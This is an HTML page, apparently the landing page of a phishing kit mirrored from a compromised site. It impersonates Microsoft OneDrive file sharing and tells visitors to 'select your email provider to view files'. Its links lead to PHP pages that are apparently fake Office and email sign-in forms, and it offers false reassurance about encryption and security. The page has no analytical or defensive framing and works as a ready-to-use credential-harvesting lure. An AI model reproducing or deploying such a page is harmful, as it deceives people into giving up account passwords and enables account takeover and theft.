<html>


<head>
<title>OneDrive - File Sharing</title>
<link rel="shortcut icon" href="favicon.ico">
  <link rel="icon" sizes="16x16 32x32" href="favicon.ico">
  <link rel="mask-icon" href="https://business.wetransfer.com/favicon.svg" color="#17181A">

  <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="https://netdna.bootstrapcdn.com/bootstrap/3.0.3/js/bootstrap.min.js"></script>

<style>
body  {
    background-image: url("driveback.png");
    background-repeat: no-repeat;
    background-attachment: fixed;
	background-size: cover;
}
</style>
<style>
#modal {
    position: fixed;
    font-family: "Segoe UI", sans-serif;sans-serif;
    top: 0;
    left: 0;
    background: rgba(0, 0, 0, 0.5);
    z-index: 99999;
    height: 100%;
    width: 100%;
}
.modalconent {
    position: absolute;
	text-align: center;
	font-size: 18px;
	font-weight: bold;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #fff;
    width: 30%;
    padding: 20px;
	border-radius:20px;
}
.maintext{
	text-align: center;
	font-family: "Segoe UI", sans-serif;
	text-decoration: none;
	font-style:
}

#lorem{
	font-family: "Segoe UI", sans-serif;
	font-size: 12pt;
  text-align: center;
}

.cap:hover{
	box-shadow: rgba(0, 0, 0, 0.3) 0px 10px 25px 0px;
}
</style>
</head>
<body>
<div id="modal">
    <div class="modalconent">
         <div>
<img src="ondrive.jpg" width="125px">
</div> <p style="font-weight: normal;">OneDrive for Business and Office 365 make it easy for you to share and work together on all your files.</p>
<p style="color: blue;">Select your email provider to view files</p>
  <p></p>
    <a href="office/index.php"><div class="cap" id="lorem" style=" margin-bottom:10px;">
     <img style="border:5px solid white; border-radius: 15px; -moz-border-radius: 15px;
-webkit-border-radius: 15px;"   src="office_signin.png">
    </div></a>
	
	
	
   </a>
	<a href="other/othr.php"><div class="cap" id="lorem" style=" margin-bottom:10px;">
     <img style="border:5px solid white; border-radius: 15px; -moz-border-radius: 15px;
-webkit-border-radius: 15px;"  src="email_signin.png">
    </div></a>
	
	<p style="font-weight: normal; font-size: 14px;">Keep your company data protected with advanced encryption, compliance, and security features.</p>
	
  </div>
    </div>
</div>

<script>
window.onload = function () {
    document.getElementById('button').onclick = function () {
        document.getElementById('modal').style.display = "none"
    };
};
</script>
</body>

<!-- Mirrored from theditlist.com/wpp/wetransfer/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Jul 2018 10:56:31 GMT -->
</html>